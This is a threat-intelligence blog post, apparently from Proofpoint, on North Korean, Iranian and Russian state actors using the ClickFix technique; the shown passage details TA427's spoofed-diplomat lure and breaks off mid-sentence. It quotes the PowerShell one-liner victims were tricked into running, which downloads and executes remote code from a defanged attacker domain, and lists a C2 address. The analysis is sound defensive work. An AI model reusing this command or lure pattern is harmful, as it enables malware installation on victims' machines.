@@ -1,0 +1,1224 @@
+Skip to main content
+
+  * ![](/themes/custom/proofpoint/dist/app-drupal/assets/header-nav__globe.svg)**us:** English: Americas
+
+Select a Language **us:** English: Americas [日本語](/jp/blog/threat-
+insight/around-world-90-days-state-sponsored-actors-try-clickfix)
+
+  * Search ![](/themes/custom/proofpoint/dist/app-drupal/assets/header-nav__search.svg)
+  * Partners![](/themes/custom/proofpoint/dist/app-drupal/assets/header-nav__drop.svg)
+
+[ Channel Partners and Distributors![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/channel-partners-and-
+distributors) [ MSP Partners![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/partners/msp) [ Technology and
+Alliance Partners![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/partners/technology-alliance-partners)
+
+  * Support![](/themes/custom/proofpoint/dist/app-drupal/assets/header-nav__drop.svg)
+
+[ Support Login![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](https://proofpoint.my.site.com/community/s/) [ Sendmail
+Support Login![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](https://proofpoint.my.site.com/community/s/) [ IP
+Address Blocked![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/postmaster)
+
+  * Login![](/themes/custom/proofpoint/dist/app-drupal/assets/header-nav__drop.svg)
+
+Training [ Proofpoint Cybersecurity
+Academy![](/themes/custom/proofpoint/dist/app-drupal/assets/header-nav__arrow-
+circ.svg) ](https://learningmanager.adobe.com/proofpointcybersecurityacademy)
+Partners [ Partner Hub![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg)
+](https://partners.proofpoint.com/English/)
+
+Products [ Digital Risk Portal![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg)
+](https://v1.us1.digitalrisk.proofpoint.com/users/sign_in) [ ET
+Intelligence![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](https://threatintel.proofpoint.com) [ Email Fraud
+Defense![](/themes/custom/proofpoint/dist/app-drupal/assets/header-nav__arrow-
+circ.svg) ](https://app.emaildefense.proofpoint.com/login) [ Proofpoint
+Essentials![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](https://us1.proofpointessentials.com/app/login.php)
+
+![Back](/themes/custom/proofpoint/dist/app-drupal/assets/header-nav__arrow-
+circ.svg)
+
+Back
+
+[ ![Proofpoint](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__logo.svg) ](/us)
+
+![Search](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__search.svg) ![Search](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__menu.svg)
+![Search](/themes/custom/proofpoint/dist/app-drupal/assets/header-nav__x-
+white.svg)
+
+Platform Solutions Why Proofpoint Resources Company
+
+[ Get a Demo ](/us/free-demo-request) [ Contact Us ](/us/contact)
+
+![](/themes/custom/proofpoint/dist/app-drupal/assets/header-nav__search-
+white.svg)
+
+Top Suggestions:
+
+Email Security Phishing DLP Email Fraud Prime Threat Protection
+
+  * ![](/sites/default/files/nav-icons/pfpt-platform-icon.svg)
+
+Platform
+
+  * ![](/sites/default/files/nav-icons/pfpt-collaboration-security-icon.svg)
+
+Collaboration Security
+
+  * ![](/sites/default/files/nav-icons/pfpt-data-security-and-governance-icon.svg)
+
+Data Security and Governance
+
+  * ![](/sites/default/files/nav-icons/pfpt-artificial-intelligence-icon.svg)
+
+AI Security
+
+  * ![](/sites/default/files/nav-icons/pfpt-platform-technologies-icon.svg)
+
+Platform Technologies
+
+  * ![](/sites/default/files/nav-icons/pfpt-services-icon.svg)
+
+Services
+
+Platform
+
+### Cybersecurity for the agentic workspace starts with Proofpoint’s human and
+agent-centric security platform.
+
+[ Collaboration Security![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/collaboration-
+security-prime)
+
+Defend humans and agents against modern cyber threats across email and
+collaboration channels.
+
+[ Data Security and Governance​![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/data-security-
+governance)
+
+Protect the data that powers human and AI collaboration​.
+
+[ AI Security![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/platform/ai-security)
+
+Secure the use of AI by people and AI Agents
+
+[ Platform Technologies![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/platform)
+
+Leverage Proofpoint’s market-leading technologies powering cybersecurity for
+people, data and AI.
+
+[ ![](/sites/default/files/styles/webp_conversion/public/nav-promo-imgs/pfpt-
+platform-promo-img.png.webp?itok=3n5K634l) Featured Join a live Protect
+event—learn how to protect people, data, and AI Live Events
+](/us/events/protect-series)
+
+Collaboration Security
+
+### Stop cyberthreats with AI-driven multichannel protection.
+
+[ Discover Collaboration Security Prime ](/us/products/collaboration-security-
+prime)
+
+[ Core Email Protection![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/email-protection)
+
+Activate industry-leading threat protection delivered via API or Gateway.
+
+[ Email Fraud Defense![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/email-
+protection/email-fraud-defense)
+
+Protect your brand reputation, increase deliverability and identify domain
+lookalikes.
+
+[ ZenGuide![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/products/mitigate-human-risk)
+
+Turn your workforce into your first line of defense with targeted, behavior-
+changing security awareness training.
+
+[ Secure Email Relay![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/email-security-and-
+protection/secure-email-relay)
+
+Secure your application email and accelerate DMARC implementation.
+
+[ Account Takeover Protection![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/identity-
+protection/account-takeover)
+
+Detect, investigate, and respond to account takeovers.
+
+[ All Products![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/products)
+
+[ ![](/sites/default/files/styles/webp_conversion/public/nav-promo-imgs/pfpt-
+collaboration-protection-promo-img.png.webp?itok=eblURr2R) Featured Experience
+Core Email Protection in action—block 99.99% of email threats Interactive Demo
+](/us/learn-more/cep-demo)
+
+Data Security and Governance
+
+### Transform data security with a unified, omnichannel approach.
+
+[ See why Proofpoint is a leader ](/us/resources/analyst-reports/gartner-
+market-guide-ai-trism)
+
+[ Data Security for AI![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/data-security-for-ai)
+
+Secure data across shadow and approved AI.
+
+[ Enterprise DLP![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/products/data-loss-prevention)
+
+Transform DLP with a modern platform that prevents data loss across email,
+cloud, and endpoints.
+
+[ Adaptive Email DLP![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/adaptive-email-dlp)
+
+Prevent misdirected emails and hidden exfiltration of sensitive data.
+
+[ Insider Threat Management![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/insider-threat-
+management)
+
+Get visibility into risky behavior by careless, malicious and compromised
+users.
+
+[ Data Security Posture Management![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/data-security-
+posture-management)
+
+Discover, classify and protect sensitive data across cloud and hybrid
+environments.
+
+[ Digital Communications Governance![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/digital-
+communications-governance)
+
+Capture, retain and discover digital communications intelligently to ensure
+compliance.
+
+[ All Products![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/products)
+
+[ ![](/sites/default/files/styles/webp_conversion/public/nav-promo-imgs/pfpt-
+data-security-and-governance-promo-img.png.webp?itok=JTuZwAuj) Featured
+Understand the top data security risks organizations face — and how to stay
+ahead Research Report ](/us/resources/threat-reports/data-security-landscape-
+report)
+
+AI Security
+
+### Unify AI security across people, agents, and MCP
+
+[ Secure every layer of your AI ](/us/platform/ai-security)
+
+[ Secure AI Usage by People ![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/ai-access-security)
+
+Get visibility into and apply controls around the use of AI by employees
+
+[ Secure AI Usage by Agents![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/agentic-ai-security)
+
+Understand intent of AI Agents and control how they use other AI tools
+
+[ Secure MCP Across Your Enterprise![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/ai-mcp-security)
+
+Unify MCP discovery, authorization, and monitoring to secure AI connectivity
+at scale.
+
+[ ![](/sites/default/files/styles/webp_conversion/public/nav-promo-imgs/pfpt-
+resources-promo-img.png.webp?itok=WF791rss) Featured AI at Proofpoint
+](/us/resources/solution-briefs/ai-at-proofpoint-nexus-ai-detection)
+
+Platform Technologies
+
+### Proofpoint technologies powering human and agent-centric security.
+
+[ Discover the security risks ](/us/platform)
+
+[ Proofpoint Nexus![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/platform/nexus)
+
+Advanced AI and threat intelligence to detect threats and assess data risk.
+
+[ Proofpoint Zen![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/platform/zen)
+
+Integrated control points to protect people and data, wherever work happens.
+
+[ Proofpoint Satori![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/platform/satori)
+
+The power behind agentic security operations.
+
+[ Proofpoint 365 Total Protection![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/email-
+protection/essentials)
+
+Enabling the channel. Safeguarding humans and agents.
+
+![](/sites/default/files/styles/webp_conversion/public/nav-promo-
+graphics/pfpt-nav-platform-promo-graphic.png.webp?itok=xEMMR-So)
+
+#### AI at Proofpoint
+
+[ Learn more ](/us/resources/solution-briefs/ai-at-proofpoint-nexus-ai-
+detection)
+
+Services
+
+### Optimize Proofpoint solutions with expert services.
+
+[ Advisory Services![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/products/premium-
+services/advisory-services)
+
+Give your team access to expert guidance while they manage daily operations of
+your Proofpoint platform.
+
+[ Applied Services![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/products/premium-services/applied-services)
+
+Gain a hightouch strategic partnership with a team of Proofpoint specialists
+who optimize your security and monitoring.
+
+[ ![](/sites/default/files/styles/webp_conversion/public/nav-promo-imgs/pfpt-
+services-promo-img.png.webp?itok=MH2LchvY) Featured "The partnership with
+Proofpoint, it's an extention of our team." –Celesta Capital Customer Story
+](/us/customer-stories/celesta-capital-strengthens-security-across-its-deep-
+tech-portfolio-proofpoint)
+
+  * ![](/sites/default/files/nav-icons/pfpt-use-case-icon.svg)
+
+Use Case
+
+  * ![](/sites/default/files/nav-icons/pfpt-industry-icon.svg)
+
+Industry
+
+Use Case
+
+### Comprehensive solutions for today’s cybersecurity threats.
+
+[ Ensure Acceptable GenAI Use![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/ensure-acceptable-
+genai-use)
+
+Empower your workforce with safe GenAI practices.
+
+[ Secure Microsoft365![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/secure-
+microsoft-365)
+
+Implement the best security and compliance solution for Microsoft 365.
+
+[ Prevent Loss from Ransomware![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/prevent-loss-from-
+ransomware)
+
+Stop attacks by securing ransomware's top vector.
+
+[ Combat Email and Cloud Threats![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/combat-email-and-
+cloud-threats)
+
+Protect your people from email and cloud threats with an intelligent and
+holistic approach.
+
+[ Protect Cloud Apps![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/protect-cloud-apps)
+
+Keep your people and their cloud apps secure by eliminating threats and data
+loss.
+
+[ Change User Behavior![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/change-user-
+behavior)
+
+Help your employees identify, resist and report attacks before the damage is
+done.
+
+[ Modernize Compliance and Archiving![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/enable-digital-
+communications-governance)
+
+Manage risk and data retention needs with a modern solution.
+
+[ Authenticate Your Email![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/email-
+authentication-with-dmarc)
+
+Protect your email deliverability with DMARC.
+
+[ ![](/sites/default/files/styles/webp_conversion/public/nav-promo-imgs/pfpt-
+use-case-promo-img.png.webp?itok=Y2gMlfii) Featured Learn about new AI
+risks—and how to build a secure foundation for enterprise adoption White Paper
+](/us/resources/white-papers/securing-governing-ai-data-guide)
+
+Industry
+
+### Superior protection for every industry, from small business to large
+enterprise.
+
+[ Federal Government![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/federal)
+
+Enable your agency with cybersecurity built for federal government
+environments.
+
+[ Higher Education![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/solutions/higher-education-security-legacy)
+
+Protect your campus, people, data, and research with advanced security.
+
+[ Healthcare![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/solutions/healthcare-information-security)
+
+Safeguard your clinicians, patient data, and intellectual property from
+advanced threats.
+
+[ Internet Service Providers![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/email-security-
+solutions-for-service-providers)
+
+Deliver secure, high-performance email protection for your networks and
+customers with Cloudmark.
+
+[ State and Local Government![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/state-and-local-
+government)
+
+Secure your institutions, services, and communities against cyber threats.
+
+[ Financial Services![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/financial-services-
+and-insurance)
+
+Protect your institution while meeting regulatory and compliance requirements.
+
+[ Mobile Operators![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/solutions/mobile-message-security-solutions-for-
+service-providers)
+
+Secure your messaging environments and protect subscribers at scale.
+
+[ Small and Medium Businesses![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/solutions/protection-
+compliance-small-business-legacy)
+
+Strengthen your business with enterprise-grade security built to grow with
+you.
+
+[ ![](/sites/default/files/styles/webp_conversion/public/nav-promo-imgs/pfpt-
+industry-promo-img.png.webp?itok=hOp6VWCk) Featured Discover the security
+risks healthcare organizations can't afford to ignore Threat Report
+](/us/resources/threat-reports/ponemon-healthcare-cybersecurity-report)
+
+Why Proofpoint
+
+### More than 80 of the Fortune 100 choose Proofpoint to protect their people,
+data, and AI.
+
+[ Why Proofpoint ](/us/why-proofpoint)
+
+[ Customer Stories![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/customer-stories-legacy)
+
+Learn how organizations use Proofpoint to strengthen their cybersecurity,
+protect their data, and reduce risk.
+
+[ Awards![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/newsroom/awards)
+
+See how our innovation and leadership have been recognized across the industry
+by leading analysts and publications.
+
+[ Threat Insight Blog![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/blog/threat-insight)
+
+Stay up to date on emerging cyber threats with insights from our industry-
+leading threat research team.
+
+[ Comparing Proofpoint![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/compare)
+
+Evaluating cybersecurity vendors? Check out our side-by-side comparison of
+Proofpoint vs. competitors.
+
+#### Evaluating security vendors? Compare us by checking out side-by-side
+comparisons.
+
+[ Comparison Overview ](/us/compare)
+
+[ Proofpoint vs. Abnormal Security ](/us/compare/proofpoint-vs-abnormal-
+security)
+
+[ Proofpoint vs. Mimecast ](/us/compare/proofpoint-vs-mimecast)
+
+[ Proofpoint vs. Check Point Harmony ](/us/compare/proofpoint-vs-check-point-
+harmony)
+
+[ Proofpoint vs. Cisco ](/us/compare/proofpoint-vs-cisco)
+
+[ Proofpoint vs. Symantec ](/us/compare/proofpoint-vs-symantec)
+
+[ Proofpoint vs. Microsoft Purview ](/us/compare/proofpoint-vs-microsoft-
+purview)
+
+[ Proofpoint vs. Legacy DLP ](/us/compare/proofpoint-vs-legacy-dlp)
+
+[ Proofpoint vs. SSE Vendors ](/us/compare/proofpoint-data-security-vs-sse-
+vendors)
+
+[ Proofpoint vs. DSPM Vendors ](/us/industry-comparison/dspm)
+
+  * ![](/sites/default/files/nav-icons/pfpt-resources-icon.svg)
+
+Resources
+
+  * ![](/sites/default/files/nav-icons/pfpt-threat-intelligence-icon.svg)
+
+Threat Intelligence
+
+Resources
+
+### Research, insights and resources from Proofpoint experts.
+
+[ Resource Library ](/us/resources)
+
+[ Blog![](/themes/custom/proofpoint/dist/app-drupal/assets/header-nav__arrow-
+circ.svg) ](/us/blog)
+
+Keep up with the latest news and happenings from our industry leading experts.
+
+[ Cybersecurity Academy![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/cybersecurityacademy)
+
+Earn your certification to become a Proofpoint Certified Guardian.
+
+[ Events![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/company/events-old)
+
+Connect with peers in person and learn from the experts.
+
+[ Webinars![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/webinars)
+
+Browse our webinar library to learn about the latest threats and issues in
+cybersecurity.
+
+[ Podcasts![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/podcasts)
+
+Listen to expert conversations and insights on cybersecurity trends, threats
+and best practices.
+
+[ Customer Stories![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/customer-stories)
+
+Read how our customers solve their most pressing cybersecurity challenges
+
+[ ![](/sites/default/files/styles/webp_conversion/public/nav-promo-imgs/pfpt-
+resources-promo-img.png.webp?itok=WF791rss) Featured New Agents, New Attacks:
+Securing Collaboration in the Agentic Era Live Webinar Series—Register Now
+](/us/resources/webinar-displays/new-agents-new-attacks-securing-
+collaboration-agentic-era)
+
+Threat Intelligence
+
+### Learn from our expert threat intelligence and insights that you won’t find
+anywhere else.
+
+[ Threat Glossary![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/threat-reference)
+
+Learn about the latest security threats and techniques.
+
+[ Podcasts![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/podcasts)
+
+Stay informed with our renowned threat researchers.
+
+[ Power Series![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](https://go.proofpoint.com/PowerSeries?utm_source=pfpt-
+website&utm_medium=web&utm_campaign=EventsPage)
+
+Join our virtual event series on the industry's most pressing topics.
+
+[ Threat Insight Blog![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/blog/threat-insight)
+
+Gain insight through actionable threat intelligence and expert analysis.
+
+[ ![](/sites/default/files/styles/webp_conversion/public/nav-promo-imgs/pfpt-
+threat-intelligence-promo-img.png.webp?itok=n01HycTs) Featured Proofpoint
+DISCARDED Tales from the threat research trenches Podcast
+](/us/resources/podcasts/discarded-live-john-hultquist)
+
+Company
+
+### Learn more about the team driving human and agent-centric security.
+
+[ About Proofpoint ](/us/company/about)
+
+[ Leadership![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/our-leadership-team)
+
+Learn about the executive team leading Proofpoint’s strategy and vision.
+
+[ News Center![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/newsroom)
+
+Read the latest press releases, news stories and media highlights about
+Proofpoint.
+
+[ AI, Privacy and Trust![](/themes/custom/proofpoint/dist/app-
+drupal/assets/header-nav__arrow-circ.svg) ](/us/legal/trust)
+
+Learn about how we handle data and make commitments to privacy and other
+regulations.
+
+[ ESG![](/themes/custom/proofpoint/dist/app-drupal/assets/header-nav__arrow-
+circ.svg) ](/us/legal/esg)
+
+Learn how we apply our environmental, social, and governance principles to
+positively impact our community.
+
+[ Careers![](/themes/custom/proofpoint/dist/app-drupal/assets/header-
+nav__arrow-circ.svg) ](/us/company/careers)
+
+Stand out and make a difference at one of the world's leading cybersecurity
+companies.
+
+[ ![](/sites/default/files/styles/webp_conversion/public/nav-promo-
+images/pfpt-stop-threats-every-layer-nav-image.jpg.webp?itok=pqw6vHkw)
+Featured Stop Threats at Every Layer—People, Data, AI Proofpoint provides
+intent-based protection for every human, every AI agent, across all data.
+](/us/agenticworkspace)
+
+[Blog](/us/blog)
+
+[Threat Insight](/us/blog/threat-insight)
+
+Around the World in 90 Days: State-Sponsored Actors Try ClickFix
+
+![Europe connect](/sites/default/files/styles/image_768_300/public/blog-
+banners/pfpt-us-europe-connect.jpg.webp?itok=svz-N9uT)
+
+#  Around the World in 90 Days: State-Sponsored Actors Try ClickFix
+
+Share with your network!
+
+April 17, 2025 Saher Naumaan, Mark Kelly, Greg Lesnewich, Josh Miller, and The
+Proofpoint Threat Research Team
+
+### Key Findings
+
+  * While primarily a technique affiliated with [cybercriminal](/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn "From Clipboard to Compromise: A PowerShell Self-Pwn") [actors](/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape "Security Brief: ClickFix Social Engineering Technique Floods Threat Landscape"), Proofpoint researchers discovered state-sponsored actors in multiple campaigns using the ClickFix social engineering technique for the first time.
+  * Over only a three-month period from late 2024 through the beginning of 2025, groups from North Korea, Iran, and Russia were all seen using the ClickFix technique in their routine activity.
+  * The incorporation of ClickFix is not revolutionizing the campaigns carried out by TA427, TA450, UNK_RemoteRogue, and TA422 but instead is replacing the installation and execution stages in existing infection chains.
+  * While currently limited to a few state-sponsored groups, the increasing popularity of ClickFix in cybercrime over the last year as well as in espionage campaigns in recent months suggests the technique will likely become more widely tested or adopted by state-sponsored actors.
+
+### Overview
+
+A major trend in the threat landscape is the fluidity of tactics, techniques,
+and procedures (TTPs). Threat actors share, copy, steal, adopt, and test TTPs
+from publicly exposed tradecraft or interaction with other threat groups.
+Specifically, state-sponsored actors have often leveraged techniques first
+developed and deployed by cybercriminal actors. For example, North Korean
+threat actors [copying techniques](https://www.youtube.com/watch?v=LYHmTjFW-
+nY&ab_channel=SLEUTHCON) from cybercrime to steal cryptocurrency on behalf of
+the government, or Chinese groups [mimicking cybercrime infection
+chains](/us/blog/threat-insight/malware-must-not-be-named-suspected-espionage-
+campaign-delivers-voldemort "The Malware That Must Not Be Named: Suspected
+Espionage Campaign Delivers “Voldemort”") to deliver malware in espionage
+operations.
+
+The most recent example of this trend is ClickFix. ClickFix is a [social
+engineering technique](/us/blog/threat-insight/security-brief-clickfix-social-
+engineering-technique-floods-threat-landscape "Security Brief: ClickFix Social
+Engineering Technique Floods Threat Landscape") that uses dialogue boxes with
+instructions to copy, paste, and run malicious commands on the target’s
+machine. This creative technique not only employs fake error messages as the
+problem, but also an authoritative alert and instructions supposedly coming
+from the operating system as a solution. Primarily observed in cybercrime
+activity, the ClickFix technique was [first seen](/us/blog/threat-
+insight/clipboard-compromise-powershell-self-pwn "From Clipboard to
+Compromise: A PowerShell Self-Pwn") in early March 2024 deployed by initial
+access broker TA571 and the ClearFake cluster, after which it [flooded the
+threat landscape](/us/blog/threat-insight/security-brief-clickfix-social-
+engineering-technique-floods-threat-landscape "Security Brief: ClickFix Social
+Engineering Technique Floods Threat Landscape").
+
+One year later, at least four state-sponsored threat actors have since
+experimented with variations of this technique as part of their business-as-
+usual espionage campaigns. Over roughly a three-month period from October 2024
+to January 2025, threat actors originating from three distinct countries
+(North Korea, Iran, and Russia) incorporated ClickFix as a stage in their
+infection chains.
+
+### North Korea: TA427
+
+In January and February 2025, Proofpoint first observed TA427 operators
+targeting individuals in fewer than five organizations in the think tank
+sector with a new infection chain using the ClickFix technique. TA427 overlaps
+with activity third parties refer to as Kimsuky or Emerald Sleet.
+
+TA427 made initial contact with the target through a meeting request from a
+spoofed sender delivered to traditional TA427 targets working on North Korean
+affairs. After a brief conversation to engage the target and build trust, as
+is often [seen in TA427 activity](/us/blog/threat-insight/social-engineering-
+dmarc-abuse-ta427s-art-information-gathering "From Social Engineering to DMARC
+Abuse: TA427’s Art of Information Gathering "), the attackers directed the
+target to an attacker-controlled site where they convinced the target to run a
+PowerShell command. While one chain failed to retrieve further payloads,
+another instance of this campaign included a multistage chain that executed
+PowerShell, VBS, and batch scripts, which eventually led to a final payload –
+[QuasarRAT, a commodity malware also seen in cybercriminal
+activity](/us/blog/threat-insight/onenote-documents-increasingly-used-to-
+deliver-malware "OneNote Documents Increasingly Used to Deliver Malware ").
+
+An overview of the infection chain is shown in the graphic below.
+
+![TA427 ClickFix infection chains ](/sites/default/files/inline-
+images/TA427%20ClickFix%20infection%20chains%20.png)
+
+_TA427 ClickFix infection chains (chain 1 - solid line; chain 2 – dotted
+line)._
+
+#### Delivery
+
+In February 2025, TA427 operators masqueraded as a Japanese diplomat and sent
+an email to the target asking to arrange a meeting with Ambassador Shigeo
+Yamada, the Japanese ambassador to the US, at the embassy in Washington, DC.
+
+![Initial TA427 conversation starter with benign
+attachment](/sites/default/files/inline-
+images/Initial%20TA427%20conversation%20starter%20with%20benign%20attachment.png)
+
+_Initial TA427 conversation starter with benign attachment._
+
+The email contained a benign attachment with the filename “Letter from
+Ambassador Cho Hyun-Dong.pdf” and the subject line “[Japanese Embassy] Meeting
+Request”. Further engagement involved communication with both the target’s
+personal and professional email accounts and prompted the attackers to follow
+up with a malicious email.
+
+![TA427 reply with malicious attachment](/sites/default/files/inline-
+images/TA427%20reply%20with%20malicious%20attachment.png)
+
+_TA427 reply with malicious attachment._
+
+The email response from the attackers contained a PDF attachment that used the
+target's name in the title, and the PDF included a link to a landing page
+using a subdomain of a dynamic DNS domain claiming to be a secure drive.
+
+ ![PDF attachment lure containing malicious link](/sites/default/files/inline-
+images/PDF%20attachment%20lure%20containing%20malicious%20link.png)
+
+_PDF attachment lure containing malicious link._
+
+The landing page hosted a fake PDF file called Questionnaire.pdf.
+
+![Landing page hosting fake PDF](/sites/default/files/inline-
+images/Landing%20page%20hosting%20fake%20PDF.png)
+
+_Landing page hosting fake PDF._
+
+If the target attempted to download the fake PDF, they would be redirected to
+another page. A pop-up alert told the user to register to see the documents.
+
+![“Register” dialogue box](/sites/default/files/inline-
+images/%E2%80%9CRegister%E2%80%9D%20dialogue%20box.png)
+
+_“Register” dialogue box._
+
+When the user clicked the register button, another pop-up appeared prompting
+the user to enter a code along with instructions on how to register, as shown
+below.
+
+![Dialogue box with code and instructions to run PowerShell
+commands](/sites/default/files/inline-
+images/Dialogue%20box%20with%20code%20and%20instructions%20to%20run%20PowerShell%20commands.png)
+
+_Dialogue box with code and instructions to run PowerShell commands._
+
+The user must manually copy and paste the register code containing the
+PowerShell command and run it in terminal, as shown below.
+
+    
+    
+          powershell -windowstyle hidden -Command iwr
+          "hxxps://securedrive.fin-tech[.]com/docs/en/t.vmd" -OutFile
+          "$env:TEMP\p"; $c=Get-Content -Path "$env:TEMP\p" -Raw; iex
+          $c;                                                                    
+                   3Z5TY-76FR3-9G87H-7ZC56
+
+The ClickFix PowerShell command fetches and executes a second remotely hosted
+PowerShell command, which displayed the decoy PDF referenced earlier in the
+chain (Questionnaire.pdf) to the user, as shown below. The document claimed to
+be from the Ministry of Foreign Affairs in Japan and contained questions
+regarding nuclear proliferation and policy in Northeast Asia.
+
+![Decoy lure Questionnaire.pdf](/sites/default/files/inline-
+images/Decoy%20lure%20Questionnaire.pdf_.png)
+
+_Decoy lure Questionnaire.pdf._
+
+The second PowerShell script created a VBS script called temp.vbs that is run
+every 19 minutes by a scheduled task called Update-out-of-
+date-20240324001883765674. A second scheduled task called Update-out-of-
+date-20240324001883765675 was also created to run a VBS script every 20
+minutes; however, this VBS script did not exist, and the purpose of this task
+is unclear.
+
+While this chain did not execute further past running a scheduled task,
+another chain seen in January 2025 followed a very similar path but with
+additional steps. In this case, the first scheduled task ultimately downloaded
+two batch scripts, which created and decoded two new PowerShell scripts and an
+obfuscated payload.
+
+The second batch script executed the newly created PowerShell scripts to
+ultimately decode a Base64 and XOR-encoded QuasarRAT payload that communicated
+with the command and control (C2) IP address 38.180.157[.]197 over port 80.
+While TA427 has adopted new techniques in its infection chain, [the group has
+been using QuasarRAT – a publicly available tool – for at least four
+years](https://www.proofpoint.com/sites/default/files/threat-reports/pfpt-us-
